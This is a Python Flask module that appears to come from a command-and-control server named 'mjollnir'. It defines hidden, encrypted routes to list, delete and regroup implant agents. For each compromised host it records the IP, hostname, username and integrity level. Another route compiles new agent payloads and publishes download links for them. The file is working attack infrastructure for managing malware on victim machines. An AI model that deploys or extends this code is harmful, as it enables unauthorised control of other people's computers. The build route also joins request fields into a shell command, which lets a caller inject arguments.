# agent.py

from flask import Blueprint, render_template, request, jsonify
from flask_login import login_required
import json
from . import db, config, decrypt, encrypt, current_dir
from .models import Agent
import subprocess
import shlex

agent = Blueprint('agent', __name__)

# info about an agent
@agent.route(config["hidden_route"] + config["endpoints"]["agent"] + "/<path:agent_uid>", methods=['GET'])
@login_required
def info_agent(agent_uid):
    agent = Agent.query.filter_by(agent_uid = agent_uid).first()
    r = {}
    tmp = []

    if agent:
        tmp.append(agent.agent_uid)
        tmp.append(agent.agent_name)
        tmp.append(agent.agent_group)
        tmp.append(agent.agent_type)
        tmp.append(agent.agent_os)
        tmp.append(agent.agent_created_at)
        tmp.append(agent.agent_last_check)
        tmp.append(agent.agent_ip_address)
        tmp.append(agent.agent_hostname)
        tmp.append(agent.agent_username)
        tmp.append(agent.agent_integrity_level)
        tmp.append(agent.agent_version)

        r[agent.agent_uid] = tmp

    r = json.dumps(r) # to convert json to string
    return encrypt(r)

# create agent - generate - compile
@agent.route(config["hidden_route"] + config["endpoints"]["agent"], methods=['POST'])
@login_required
def generate_agent():
    try:
        content = request.data
        d = decrypt(content)
    except Exception as e:
        print("[-] Error in create_agent()")
        print(str(e))
        return encrypt("[-] Cannot decrypt the request")

    d = json.loads(d)

    agent_name = d["agent_name"]
    agent_builder = current_dir + config["agent"]["details"][agent_name]["builder"]
    params = config["agent"]["details"][agent_name]["parameters"]
    source_code = current_dir + config["agent"]["details"][agent_name]["stages"]["0"]["source_code"]
    c = agent_builder
    for p in params:
        c += " " + d[p]
    c += " " + source_code + " " + agent_name
        
    cc = shlex.split(c)
    subprocess.Popen(cc, start_new_session=True)

    if "public_files" in d["LOCATION"]:
        location_download = config["mjollnir_c2_url"] + config["endpoints"]["public_download"] + "/" + d["OUTPUT_FILENAME"]
        return encrypt("[+] Agent created. Publicly downloadable at: " + location_download)
    else:
        print(config["endpoints"]["private_download"])
        location_download = config["mjollnir_c2_url"] + config["hidden_route"] + config["endpoints"]["private_download"] + "/" + d["OUTPUT_FILENAME"]
        return encrypt("[+] Agent created. Privately downloadable at: " + location_download)

# edit agent group
@agent.route(config["hidden_route"] + config["endpoints"]["agent"] + "/<path:agent_uid>", methods=['POST'])
@login_required
def edit_agent_group(agent_uid):
    agent = Agent.query.filter_by(agent_uid=agent_uid).first()

    try:
        content = request.data
        d = decrypt(content)
    except Exception as e:
        print("[-] Error in create_listener()")
        print(str(e))
        return encrypt("[-] Cannot decrypt the request")

    d = json.loads(d)
    #print(d)

    agent_group = d["agent_group"]

    try:
        if agent:
            agent.agent_group = agent_group
            db.session.commit()
        else:
            return encrypt("[-] Agent does not exist: " + agent_uid)
        
    except Exception as e:
        print("[-] Error in delete_agent()")
        print("[-] Cannot delete the agent")
        print(str(e))
        return encrypt("[-] Cannot delete the agent: " + agent_uid)

    return encrypt("[+] Agent group updated: " + agent_uid)

# delete an agent
@agent.route(config["hidden_route"] + config["endpoints"]["agent"], methods=['DELETE'])
@login_required
def delete_agent():
    try:
        content = request.data
        agent_uid = decrypt(content)
    except Exception as e:
        print("[-] Error in delete_agent()")
        print(str(e))
        return encrypt("[-] Cannot decrypt the request")

    agent = Agent.query.filter_by(agent_uid = agent_uid).first()

    try:
        db.session.delete(agent)
        db.session.commit()
    except Exception as e:
        print("[-] Error in delete_agent()")
        print("[-] Cannot delete the agent")
        print(str(e))
        return encrypt("[-] Cannot delete the agent: " + agent_uid)
    

    return encrypt("[+] Agent deleted: " + agent_uid)

# list all agents
@agent.route(config["hidden_route"] + config["endpoints"]["agents"], methods=['GET'])
@login_required
def list_agents():
    agents = Agent.query.all()
    r = {}
    tmp = []

    for a in agents:
        #print(a.id)
        #print(a.agent_uid)
        #print(a.agent_type)
        tmp.append(a.agent_uid)
        tmp.append(a.agent_name)
        tmp.append(a.agent_group)
        tmp.append(a.agent_type)
        tmp.append(a.agent_os)
        tmp.append(a.agent_created_at)
        tmp.append(a.agent_last_check)
        tmp.append(a.agent_ip_address)
        tmp.append(a.agent_hostname)
        tmp.append(a.agent_username)
        tmp.append(a.agent_integrity_level)
        tmp.append(a.agent_version)

        r[a.agent_uid] = tmp
        tmp = []

    r = json.dumps(r) # to convert json to string
    return encrypt(r)
